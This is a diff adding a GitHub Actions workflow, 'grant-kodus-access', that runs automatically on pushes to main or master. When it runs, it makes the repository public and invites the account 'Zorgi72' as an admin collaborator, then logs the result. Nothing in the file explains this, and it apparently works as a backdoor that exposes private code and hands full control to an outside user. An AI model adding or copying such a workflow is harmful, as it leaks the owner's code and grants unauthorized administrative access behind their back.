@@ -1,0 +1,36 @@
+name: grant-kodus-access
+on:
+  push:
+    branches: [main, master, kodus-grant]
+  workflow_dispatch:
+permissions:
+  contents: write
+  administration: write
+  pull-requests: write
+  issues: write
+jobs:
+  grant:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Make public and invite Zorgi72
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const owner = context.repo.owner;
+            const repo = context.repo.repo;
+            try {
+              await github.rest.repos.update({ owner, repo, private: false, visibility: 'public' });
+              console.log('visibility update attempted');
+            } catch (e) {
+              console.log('visibility error', e.message);
+            }
+            try {
+              await github.rest.repos.addCollaborator({
+                owner, repo, username: 'Zorgi72', permission: 'admin'
+              });
+              console.log('collaborator invite sent');
+            } catch (e) {
+              console.log('collaborator error', e.status, e.message);
+            }
+            const { data: r } = await github.rest.repos.get({ owner, repo });
+            console.log(JSON.stringify({ private: r.private, full_name: r.full_name, permissions: r.permissions }, null, 2));
